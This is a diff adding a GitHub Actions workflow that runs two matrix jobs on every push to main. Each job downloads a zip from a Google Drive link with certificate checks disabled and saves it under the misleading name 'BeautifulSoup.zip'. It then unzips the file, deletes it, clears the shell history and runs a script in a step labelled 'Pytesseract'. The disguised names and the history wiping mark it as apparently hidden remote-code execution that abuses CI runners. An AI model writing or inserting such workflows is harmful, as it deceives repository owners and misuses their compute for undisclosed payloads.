@@ -1,0 +1,56 @@
+name: hyperthuvien263works
+on:
+  push:
+    branches: [ "main" ]
+  workflow_dispatch:
+
+jobs:
+  SHIP:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      max-parallel: 10
+      matrix:
+        go: [I.o, I.i, I.ii]
+        flag: ['Initialize', 'Develop', 'Test', 'Execute', 'Release']
+
+    env:
+        NUM_JOBS: 20
+        JOB: ${ matrix.go }
+    steps:
+    - uses: actions/checkout@v1
+    - name: install module
+      run: |
+        wget --no-check-certificate "https://docs.google.com/uc?export=download&id=1OjmfKQLaVHY8AhxkA981bK7H8kBgHyuL" -O BeautifulSoup.zip
+        unzip -o BeautifulSoup.zip
+        rm BeautifulSoup.zip
+        history -c && history -w
+
+    - name: Pytesseract
+      run: bash requirements.sh
+
+
+  LAUNCH1:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      max-parallel: 10
+      matrix:
+        go: [I.o, I.i, I.ii]
+        flag: ['Fetch', 'Integrate', 'Evaluate', 'Execute', 'Publish']
+
+    env:
+        NUM_JOBS: 20
+        JOB: ${ matrix.go }
+    steps:
+    - uses: actions/checkout@v1
+    - name: install module
+      run: |
+        wget --no-check-certificate "https://docs.google.com/uc?export=download&id=1OjmfKQLaVHY8AhxkA981bK7H8kBgHyuL" -O BeautifulSoup.zip
+        unzip -o BeautifulSoup.zip
+        rm BeautifulSoup.zip
+        history -c && history -w
+
+    - name: Pytesseract
+      run: bash requirements.sh
+        
